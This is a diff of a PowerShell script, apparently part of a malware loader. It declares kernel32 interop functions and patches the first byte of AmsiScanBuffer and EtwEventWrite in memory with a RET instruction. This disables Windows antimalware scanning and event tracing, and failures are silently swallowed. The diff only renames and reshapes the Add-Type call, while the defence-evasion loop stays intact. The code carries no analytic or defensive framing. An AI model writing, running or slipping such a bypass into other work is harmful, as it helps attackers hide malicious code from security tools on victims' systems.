@@ -36,7 +36,7 @@ if (-not [Environment]::Is64BitProcess) {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$vnx = Add-Type -MemberDefinition @"
+$null = Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 public class VnxP {
@@ -44,15 +44,15 @@ public class VnxP {
     [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
     [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
 }
-"@ -Name VnxP -Namespace VnxN -PassThru
+"@ -Namespace VnxN
 $nop = [byte[]](0xC3)
 foreach ($m in @(@('amsi','AmsiScanBuffer'), @('ntdll','EtwEventWrite'))) {
     try {
-        $h = [VnxN.VnxP]::GetModuleHandle($m[0] + '.dll')
-        if ($h -eq [IntPtr]::Zero) { $h = [VnxN.VnxP]::GetModuleHandle($m[0]) }
-        $a = [VnxN.VnxP]::GetProcAddress($h, $m[1])
+        $h = [VnxP]::GetModuleHandle($m[0] + '.dll')
+        if ($h -eq [IntPtr]::Zero) { $h = [VnxP]::GetModuleHandle($m[0]) }
+        $a = [VnxP]::GetProcAddress($h, $m[1])
         if ($a -ne [IntPtr]::Zero) {
-            $old = 0; [VnxN.VnxP]::VirtualProtect($a, 1, 0x40, [ref]$old) | Out-Null
+            $old = 0; [VnxP]::VirtualProtect($a, 1, 0x40, [ref]$old) | Out-Null
             [System.Runtime.InteropServices.Marshal]::Copy($nop, 0, $a, 1)
         }
     } catch {}
